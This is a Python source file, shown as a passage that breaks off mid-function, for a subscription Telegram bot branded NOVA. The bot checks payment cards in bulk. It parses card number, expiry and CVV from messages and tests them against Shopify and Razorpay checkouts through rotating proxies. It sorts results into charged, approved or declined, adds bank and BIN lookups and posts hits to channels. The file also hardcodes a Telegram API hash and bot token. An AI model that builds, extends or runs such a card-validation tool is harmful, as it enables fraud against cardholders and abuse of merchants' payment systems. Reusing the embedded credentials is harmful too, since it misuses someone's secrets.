# 𝙉𝙊𝙑𝘼 𝘽𝙤𝙩  —  v4.0.0  (Full NOVA + API-Based + All Tools)
# API-based Shopify/Razorpay checks • Mongo users/proxies/sites • JSON keys/refs/streaks
# ──────────────────────────────────────────────────────────────────────────

from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio, aiohttp, aiofiles, os, random, time, json, re, string, logging
import socket, platform, hashlib
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List
from telethon.errors import UserNotParticipantError, ChatAdminRequiredError, ChannelPrivateError

try:
    import psutil; PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database import (
    init_db, db, ensure_user, get_user_plan, set_user_plan, is_premium_user,
    is_banned_user, add_proxy_db, get_all_user_proxies, get_proxy_count,
    get_random_proxy, remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db, save_card_to_db, get_total_cards_count,
    get_charged_count, get_approved_count, get_all_premium_users, get_total_users,
    get_premium_count, get_total_sites_count, get_users_with_sites, get_sites_per_user,
    get_all_sites_detail, mark_user_joined, is_user_marked_joined, remove_joined_mark,
)

# ═════════ LOGGING ═════════
log = logging.getLogger("NOVA"); log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler(); _ch.setLevel(logging.INFO); _ch.setFormatter(_fmt); log.addHandler(_ch)
try:
    _fh = logging.FileHandler('nova_bot.log', encoding='utf-8'); _fh.setLevel(logging.INFO); _fh.setFormatter(_fmt); log.addHandler(_fh)
except Exception: pass

def log_user(uid, action, msg, level="info"): getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")
def log_system(action, msg, level="info"): getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")

# ═════════ BOLD SANS ═════════
_BOLD = {}
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"): _BOLD[_c] = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"[_i]
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"): _BOLD[_c] = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"[_i]
for _i, _c in enumerate("0123456789"): _BOLD[_c] = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"[_i]

def bs(text): return "".join(_BOLD.get(c, c) for c in str(text)) if text else text

# ═════════ CONFIG — NOVA IDENTITY ═════════
API_ID = 33657928
API_HASH = "a61fde61442113b9a65c699f7020d59a"
BOT_TOKEN = "8881611682:AAGUaw5qi17Qy3cLGtJwIe6qXoK17WcW_lU"
ADMIN_ID = [8871910561]

BOT_BRAND = "NOVA"
BOT_USERNAME = "@spectrumxchkbot"
OWNER_NAME = "SUPERGREMLIN"
OWNER_TAG = "SUPERGREMLIN01"
OWNER_LINK = f"https://t.me/{OWNER_TAG}"
DEV_LINE = f"⌬ {bs('Bot By')} <a href='{OWNER_LINK}'>{bs(OWNER_TAG)}</a>"
SEP = "━━━━━━━━━━━━━━━━━"
PE = "⭐"

HIT_CHANNEL_ID = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
JOIN_GROUP_ID = -1003902938287
JOIN_CHANNEL_ID = -1004381920430
LOG_CHANNEL_ID = HIT_CHANNEL_ID
REDEEM_LOG_CHANNEL_ID = -1003902938287
GROUP_FORWARD_ID = -1003902938287

JOIN_GROUP_LINK = "https://t.me/+_0kBIVQujUEyOTc1"
JOIN_CHANNEL_LINK = "https://t.me/+3dlEoWK-vGcwMDI9"
FORCE_JOIN_IMAGES = ["", ""]

API_BASE_URL = os.getenv("API_BASE_URL", "https://web-production-0919d.up.railway.app/shopify")
RAZORPAY_API_URL = os.getenv("RAZORPAY_API_URL", "https://rz.rcvan.indevs.in/rz")

SP_PER_USER_WORKERS = 30; MSP_PER_USER_WORKERS = 70; RZ_PER_USER_WORKERS = 30
MRZ_PER_USER_WORKERS = 50; SITE_PER_USER_WORKERS = 30; PROXY_PER_USER_WORKERS = 50
HARVEST_PER_USER_WORKERS = 40; BIN_WORKERS = 20

API_TIMEOUT = 60; BIN_TIMEOUT = 60; PROXY_TIMEOUT = 12; RZ_TIMEOUT = 60
SHOPIFY_SINGLE_TIMEOUT = 90.0; RAZORPAY_SINGLE_TIMEOUT = 120.0

BATCH_SIZE = 60; SITE_CHECK_BATCH = 40; HIT_DELAY = 1.5; PER_USER_LIMIT = 200
FREE_SP_DAILY_LIMIT = 15; FREE_SP_COOLDOWN = 10; MAX_PROXIES_PER_USER = 100
DEFAULT_KEY_HOURS = 24; DEFAULT_KEY_CC_LIMIT = 1500

REFERRAL_MILESTONE_EVERY = 5; REFERRAL_MILESTONE_HOURS = 24
REFERRAL_MILESTONE_CC_LIMIT = 5000; REFERRAL_MIN_CHECKS = 1; REFERRAL_MAX_PER_USER = 500

STREAK_MIN_GAP_HOURS = 20; STREAK_MAX_GAP_HOURS = 30
STREAK_MILESTONES = {3: 6, 7: 24, 14: 72, 30: 240}

PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

DEFAULT_KEYWORD_STEMS = ["coffee","tea","candle","soap","skincare","beauty","cosmetics","fashion","clothing","apparel","shoes","jewelry","accessories","bags","watches","home","kitchen","bedding","furniture","decor","art","prints","posters","toys","kids","baby","pets","dog","cat","fitness","sports","outdoor","camping","garden","plants","tech","gadgets","electronics","books","stationery","snacks","food","drinks","wine","beer","supplements","vitamins","protein","roasters","boutique","vintage","modern","organic","natural","handmade","luxury","minimalist","sustainable","eco","wellness","selfcare"]

# ═════════ SEMAPHORES ═════════
_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)

def get_user_sem(uid, t="msp"):
    k = f"{uid}_{t}"
    if k not in _USER_SEMS:
        _USER_SEMS[k] = asyncio.Semaphore({"sp":SP_PER_USER_WORKERS,"msp":MSP_PER_USER_WORKERS,"rz":RZ_PER_USER_WORKERS,"mrz":MRZ_PER_USER_WORKERS,"site":SITE_PER_USER_WORKERS,"proxy":PROXY_PER_USER_WORKERS,"harvest":HARVEST_PER_USER_WORKERS}.get(t,30))
    return _USER_SEMS[k]

def cleanup_user_sem(uid):
    for k in [k for k in list(_USER_SEMS.keys()) if k.startswith(f"{uid}_")]: del _USER_SEMS[k]

# ═════════ CUSTOM EMOJI ═════════
CE = {
    "crown":5039727497143387500,"bolt":5042334757040423886,"brain":5040030395416969985,
    "shield":5042328396193864923,"star":5042176294222037888,"gem":5042050649248760772,
    "check":5039793437776282663,"fire":5039644681583985437,"party":5039778134807806727,
    "search":5039649904264217620,"chart":5042290883949495533,"pin":5039600026809009149,
    "joker":5039998939076494446,"plus":5039891861246838069,"cross":5040042498634810056,
    "info":5042306247047513767,"gift":5041975203853239332,"eyes":5039623284056917259,
    "trash":5039614900280754969,"tick":5039844895779455925,"stop":5039671744172917707,
    "warn":5039665997506675838,"link":5042101437237036298,"globe":5042186567783809934,
    "restart":5413554170668032766,"online":5413813953685923984,"declined":4956612582816351459,
}

# ═════════ GLOBAL STATE ═════════
ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_MRZ_PROCESSES = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_SITE_CHECK = {}
USER_APPROVED_PREF = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINT = {"enabled": None, "ts": 0}
_JOIN_CACHE = {}
_FREE_USAGE = {}
_FREE_LAST = {}
_BIN_CACHE = {}
_BIN_CACHE_CC = {}
BOT_START_TIME = time.time()
HIT_BUTTON = [[Button.url(bs("NOVA"), "https://t.me/spectrumxchkbot")]]

# ═════════ HTTP SESSIONS ═════════
_SESSIONS = {}
_GLOBAL_BIN = None
_GLOBAL_PROXY = None
_GLOBAL_HTTP = None

async def get_user_http_session(uid, purpose="general"):
    k = f"{uid}_{purpose}"
    s = _SESSIONS.get(k)
    if s is None or s.closed:
        tv = RZ_TIMEOUT if purpose in ("rz","mrz") else API_TIMEOUT
        c = aiohttp.TCPConnector(limit=150, limit_per_host=50, ttl_dns_cache=300, use_dns_cache=True, keepalive_timeout=30, enable_cleanup_closed=True)
        s = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=tv, connect=10), connector=c)
        _SESSIONS[k] = s
    return s

async def cleanup_user_http_session(uid, purpose="general"):
    s = _SESSIONS.pop(f"{uid}_{purpose}", None)
    if s and not s.closed:
        try: await s.close()
        except Exception: pass

async def get_bin_session():
    global _GLOBAL_BIN
    if _GLOBAL_BIN is None or _GLOBAL_BIN.closed:
        _GLOBAL_BIN = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5), connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_BIN

async def get_proxy_session():
    global _GLOBAL_PROXY
    if _GLOBAL_PROXY is None or _GLOBAL_PROXY.closed:
        _GLOBAL_PROXY = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15), connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_PROXY

async def get_http_session():
    global _GLOBAL_HTTP
    if _GLOBAL_HTTP is None or _GLOBAL_HTTP.closed:
        _GLOBAL_HTTP = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=45, connect=10), connector=aiohttp.TCPConnector(limit=500, limit_per_host=200, ttl_dns_cache=600, use_dns_cache=True, enable_cleanup_closed=True))
    return _GLOBAL_HTTP

# ═════════ FREE TRACKER ═════════
def _today(): return datetime.now().strftime("%Y-%m-%d")

def get_free_sp_usage(uid):
    e = _FREE_USAGE.get(uid)
    if not e or e.get("date") != _today(): _FREE_USAGE[uid] = {"date": _today(), "count": 0}; return 0
    return e["count"]

def increment_free_sp_usage(uid):
    e = _FREE_USAGE.get(uid)
    if not e or e.get("date") != _today(): _FREE_USAGE[uid] = {"date": _today(), "count": 1}
    else: e["count"] += 1

def get_free_sp_cooldown_remaining(uid):
    last = _FREE_LAST.get(uid, 0); el = time.time() - last
    return 0 if el >= FREE_SP_COOLDOWN else round(FREE_SP_COOLDOWN - el, 1)

def set_free_sp_last_use(uid): _FREE_LAST[uid] = time.time()

# ═════════ ROTATOR ═════════
class SmartRotator:
    def __init__(self): self._sf = {}; self._pf = {}; self._si = 0; self._pi = 0
    def pick_site(self, sites, exclude=None):
        if not sites: return None
        exclude = exclude or set()
        a = [s for s in sites if s not in exclude and self._sf.get(s, 0) < 5] or [s for s in sites if s not in exclude] or list(sites)
        self._si = (self._si + 1) % len(a); return a[self._si]
    def pick_proxy(self, proxies, exclude=None):
        if not proxies: return None
        exclude = exclude or set()
        a = [p for p in proxies if p.get('proxy_url') not in exclude and self._pf.get(p.get('proxy_url'), 0) < 5] or [p for p in proxies if p.get('proxy_url') not in exclude] or list(proxies)
        self._pi = (self._pi + 1) % len(a); return a[self._pi]
    def report_site_ok(self, s): self._sf[s] = 0
    def report_site_fail(self, s): self._sf[s] = self._sf.get(s, 0) + 1
    def report_proxy_ok(self, p):
        if p: self._pf[p] = 0
    def report_proxy_fail(self, p):
        if p: self._pf[p] = self._pf.get(p, 0) + 1

# ═════════ ERROR DETECTION ═════════
_SITE_ERR = ['r4 token empty','payment method is not shopify','r2 id empty','product id is empty','py id empty','clinte token','receipt_empty','receipt id is empty','receipt empty','site requires login','failed to get token','no valid products','not shopify','failed to get checkout','failed to detect product','failed to create checkout','failed to get proposal data','site not supported','site error! status: 429','token not found','handle is empty','payment method identifier is empty','failed to get session token','failed to tokenize card','no_session_token','no session token','no checkout token found','checkout token not found','no checkout token','checkout token is empty','tokenize_fail','tokenize fail','tax ammount empty','tax amount empty','tax amount is empty','del ammount empty','site not supported for now','payment base card not supported','no product found','checkout is not available','cart is empty','cart add failed after retries','checkout_expired','checkout_not_found','no shipping methods available','site error','site dead','site errors','server error','internal server error','internal_server_error','application error','unexpected error','something went wrong','error in 1st req','error in 1 req','error processing card','we could not process','unable to process','payment provider error','payment gateway error','session expired','session invalid','failed after retries','max retries exceeded','all sites dead','all sites unavailable','processinf error','handle error','nonetype',"nonetype' object has no attribute 'get",'unknown error','unknown_error','unknown_result','utm_source','shop is unavailable','store is unavailable','store not found','page not found','this store is unavailable','this shop is currently unavailable','password protected','enter store using password','storefront is password protected','shop closed','store closed','delivery_delivery_line_detail_changed','delivery_address2_required','delivery_line_detail_changed','delivery_line','delivery_address','address_required','submit_rejected','submit rejected:','change proxy or site','change site','fake charge gate','fake gate','hcaptcha detected','hcaptcha_detected','captcha at checkout','captcha_required','captcha required','cloudflare','access denied','permission denied','connection error','connection failed','timed out','timeout','could not resolve host','connect tunnel failed','unreachable','network error','connection reset','empty reply from server','tlsv1 alert','ssl routines','openssl ssl_connect','api_timeout','http error','httperror504','502','503','504','bad gateway','service unavailable','gateway timeout','site error! status: 404','site error! status: 401','amount_too_small','amount too small','merchandise_not_enough_stock','product out of stock','malformed input','url rejected','invalid_response','cart failed with status','invalid json response','invalid json','inventoryreservationfailure','inventory_reservation_failure','payments_positive_amount_expec','payments_payment_flexibility_t','payments_credit_card_brand_not','buyer_identity_presentment_currency',"'products'","error:","error: '",'unable to get payment token','empty submit response','empty submit','order_total_changed','order total changed','invalid_payment_method','invalid payment method','validation_custom','validation custom','ARTIFACT_DISSATISFACTION','artifact_dissatisfaction','TAX_NEW_TAX_MUST_BE_ACCEPTED','tax_new_tax_must_be_accepted','PROCESSING_ERROR','processing_error','DELIVERY_COMPANY_REQUIRED','delivery_company_required','DECISION_RULE_BLOCK','decision_rule_block','timeout']
_PROXY_ERR = ['proxy dead','proxy error','proxy timeout','proxy connection failed','proxy refused']
_RZ_RETRY = ['payment id not found','payment_id_not_found','timeout','timed out','connection error','connection failed','connection reset','server error','internal server error','502','503','504','bad gateway','service unavailable','gateway timeout','empty reply','invalid json','could not resolve host','network error','ssl routines','unreachable','proxy dead','proxy error','proxy timeout','DEAD | Payment ID not found','timeout']

def is_site_error(t):
    if not t: return True
    l = t.lower().strip()
    return l == 'na' or any(k in l for k in _SITE_ERR)

def is_proxy_error(t): return bool(t) and any(k in t.lower().strip() for k in _PROXY_ERR)
def is_rz_retry_error(t): return (not t) or any(k in t.lower().strip() for k in _RZ_RETRY)

def is_truly_alive(resp, price):
    if not resp: return False
    l = resp.lower().strip(); pc = str(price).replace('$', '').strip() if price else '0'
    try: pv = float(pc)
    except Exception: pv = 0.0
    if any(b in l for b in ['error:', 'error: ', "error: '", 'cart failed', 'invalid json', 'inventoryreservationfailure', 'payments_positive_amount', 'payments_payment_flexibility', 'payments_credit_card_brand']): return False
    if pv == 0.0:
        n = ['card_declined','card declined','generic_decline','generic decline','do_not_honor','do not honor','insufficient_funds','insufficient funds','stolen_card','lost_card','expired_card','expired card','otp_required','otp required','3d','authentication','cvc','ccn','generic_error','generic error','restricted_card','fraudulent','not_permitted','transaction_not_allowed','card_not_supported']
        if not any(x in l for x in n): return False
    return True

# ═════════ URL HELPERS ═════════
def normalize_site_url(url):
    url = url.strip().lower(); url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'): url = url[4:]
    if '/' in url: url = url.split('/')[0]
    return url

def normalize_rz_url(url):
    url = url.strip()
    if not url.startswith(('http://','https://')): url = 'https://' + url
    return url.rstrip('/')

def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://','https://')):
        try: d = urlparse(url).netloc
        except Exception: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))

# ═════════ MESSAGE SYSTEM ═════════
client_instance = None

def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, up = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=up, length=1, document_id=emoji_ids[idx])); idx += 1
            up += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError: return None
    except Exception:
        try: return await asyncio.wait_for(event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except Exception: return None

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False), timeout=15)
    except Exception: return None

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False), timeout=8)
    except Exception: pass

async def send_entities(chat_id, html_text, buttons=None, file=None, **kw):
    try:
        text, ents = build_entities(html_text)
        return await client_instance.send_message(chat_id, text, formatting_entities=ents, buttons=buttons, link_preview=False, **kw)
    except Exception as e: log_system("SEND", f"{e}", "error"); return None

async def send_file_entities(chat_id, file, html_caption, buttons=None, **kw):
    try:
        text, ents = build_entities(html_caption)
        return await client_instance.send_file(chat_id, file, caption=text, formatting_entities=ents, buttons=buttons, **kw)
    except Exception as e: log_system("SEND_FILE", f"{e}", "error"); return None

def pbtn(text, data=None, url=None):
    if url: return Button.url(text, url)
    if data: return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ═════════ CARD FORMAT ═════════
def _bb(bi):
    bi = bi or {}
    return (f"<b>{bs('BIN')}:</b> <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>\n"
            f"<b>{bs('Bank')}:</b> <code>{bi.get('bank','-')}</code>\n"
            f"<b>{bs('Country')}:</b> <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>")

def _hdr(s):
    return {"Charged": f"🥇 <b>{bs('CHARGED')}</b>", "Approved": f"🥈 <b>{bs('APPROVED')}</b>", "Declined": f"🥔 <b>{bs('DECLINED')}</b>", "Error": f"🧨 <b>{bs('ERROR')}</b>"}.get(s, f"🥔 <b>{bs('DECLINED')}</b>")

def _he(s):
    return [CE["fire"]] if s == "Charged" else [CE["check"]] if s == "Approved" else [CE["declined"]] if s == "Declined" else [CE["cross"]]

def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    h = _hdr(status); he = _he(status)
    ps = f"${str(price).replace('$','')}" if price and price != "-" else "-"
    return f"""{h}
<b>{SEP}</b>
<a href='{OWNER_LINK}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>{SEP}</b>
{_bb(bin_info)}

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_card_result_no_price(status, card, gateway, response, bin_info=None):
    h = _hdr(status); he = _he(status)
    return f"""{h}
<b>{SEP}</b>
<a href='{OWNER_LINK}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{SEP}</b>
{_bb(bin_info)}""", he

def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    h = _hdr(status); he = _he(status)
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>{SEP}</b>
<a href='{OWNER_LINK}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>{SEP}</b>
{_bb(bin_info)}

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_rz_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0):
    return format_simple_card_result(status, card, gateway, response, bin_info, elapsed)

# ═════════ FORCE JOIN ═════════
async def is_user_joined(uid):
    if uid in ADMIN_ID: return True
    now = time.time()
    if _JOIN_CACHE.get(uid) and now - _JOIN_CACHE[uid] < 600: return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=uid))
            if isinstance(r.participant, ChannelParticipantBanned): return False
        except UserNotParticipantError: return False
        except (ChatAdminRequiredError, ChannelPrivateError): pass
        except Exception: pass
    _JOIN_CACHE[uid] = now; return True

async def force_join_check(event):
    if event.sender_id in ADMIN_ID: return True
    if await is_user_joined(event.sender_id): return True
    _JOIN_CACHE.pop(event.sender_id, None)
    try: await remove_joined_mark(event.sender_id)
    except Exception: pass
    kb = [[pbtn(bs("Join Channel"), url=JOIN_CHANNEL_LINK)], [pbtn(bs("Join Group"), url=JOIN_GROUP_LINK)], [pbtn(bs("I have joined"), data="check_joined")]]
    text = f"""{PE} <b>{bs('Access Locked')}</b> {PE}
<b>{SEP}</b>
{PE} <b>{bs('Join Both Chats to Unlock')}</b>
<b>{SEP}</b>
{PE} <b>{bs('Channel')}:</b> <i>{bs('NOVA CHANNEL')}</i>
{PE} <b>{bs('Group')}:</b> <i>{bs('NOVA Chat')}</i>
<b>{SEP}</b>
{PE} <b>{bs('All Features Restricted')}</b>"""
    imgs = [x for x in FORCE_JOIN_IMAGES if x]
    try: await styled_reply(event, text, buttons=kb, emoji_ids=[CE["fire"],CE["fire"],CE["stop"],CE["link"],CE["info"],CE["warn"]], file=random.choice(imgs) if imgs else None)
    except Exception: await styled_reply(event, text, buttons=kb, emoji_ids=[CE["fire"],CE["fire"],CE["stop"],CE["link"],CE["info"],CE["warn"]])
    return False

# ═════════ MAINTENANCE ═════════
async def set_maintenance_mode(enabled):
    global _MAINT
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f: await f.write(json.dumps({"maintenance": enabled}))
        _MAINT = {"enabled": enabled, "ts": time.time()}
    except Exception: pass

async def get_maintenance_mode():
    global _MAINT
    now = time.time()
    if _MAINT["enabled"] is not None and now - _MAINT["ts"] < 30: return _MAINT["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE): return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f: d = json.loads(await f.read())
        _MAINT = {"enabled": d.get("maintenance", False), "ts": now}; return _MAINT["enabled"]
    except Exception: return False

async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"{PE} <b>{bs('Maintenance')}</b> {PE}\n<b>{SEP}</b>\n{PE} <b>{bs('Bot under maintenance')}</b>\n{PE} <i>{bs('Try again later')}</i>", emoji_ids=[CE["stop"],CE["stop"],CE["warn"],CE["info"]]); return True
    return False

# ═════════ ACCESS ═════════
async def can_use(uid, chat):
    await ensure_user(uid)
    if await is_banned_user(uid): return False, "banned"
    plan = (await get_user_plan(uid)).title()
    return True, f"{plan}_private" if chat.id == uid else f"{plan}_group"

async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id): return False, "banned", "Bronze"
    plan = (await get_user_plan(event.sender_id)).title()
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan

def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID: return 10000
    p = plan.title() if plan else "Bronze"
    return {"X": 10000, "Root": 5000, "Elite": 2500, "Core": 1500}.get(p, 0)

def is_paid_plan(plan): return plan.title() in PAID_TIERS if plan else False

async def send_group_only_message(event):
    return await styled_reply(event, f"{PE} <b>{bs('Group Only')}</b> {PE}\n<b>{SEP}</b>\n{PE} <b>{bs('Free users')} → {bs('group only')}</b>\n{PE} <i>{bs('Upgrade for private access')}</i>", emoji_ids=[CE["stop"],CE["stop"],CE["warn"],CE["gem"]])

async def send_premium_only_message(event):
    return await styled_reply(event, f"{PE} <b>{bs('Premium Only')}</b> {PE}\n<b>{SEP}</b>\n{PE} <b>{bs('This feature requires an active plan')}</b>\n{PE} <i>{bs('Use /plan to see available plans')}</i>", buttons=[[pbtn(bs("Upgrade"), url=OWNER_LINK)]], emoji_ids=[CE["stop"],CE["stop"],CE["warn"],CE["info"]])

def banned_user_message():
    return f"{PE} <b>{bs('Banned')}</b> {PE}\n<b>{SEP}</b>\n{PE} <b>{bs('Not allowed')}</b>\n{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>", [CE["stop"],CE["stop"],CE["warn"],CE["info"]]

# ═════════ UTILITIES ═════════
def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen: seen.add(n); result.append(n)
            continue
        cl = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cl:
            n = normalize_site_url(cl)
            if n and is_valid_url_or_domain(n) and n not in seen: seen.add(n); result.append(n)
    return result

def extract_rz_urls(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_rz_url(m.group(1))
            if n and n not in seen: seen.add(n); result.append(n)
            continue
        cl = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cl:
            n = normalize_rz_url(cl)
            if n and n not in seen: seen.add(n); result.append(n)
    return result

def parse_proxy_format(proxy):
    proxy = proxy.strip(); pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m: u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy); ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy); h, p = m3.groups()
    else: return None
    if not h or not p: return None
    try:
        if not (0 < int(p) <= 65535): return None
    except Exception: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: return True, (await r.json()).get('ip', '?')
            return False, None
    except Exception as e: return False, str(e)

async def get_bin_info(cn):
    cn6 = cn[:6] if cn else ''
    if not cn6 or len(cn6) < 6: return {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
    if cn6 in _BIN_CACHE: return _BIN_CACHE[cn6]
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn6}') as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    result = {"brand": d.get('brand','-') or '-', "type": d.get('type','-') or '-', "level": d.get('level','-') or '-', "bank": d.get('bank','-') or '-', "country": d.get('country_name','-') or '-', "flag": d.get('country_flag','🏳️') or '🏳️'}
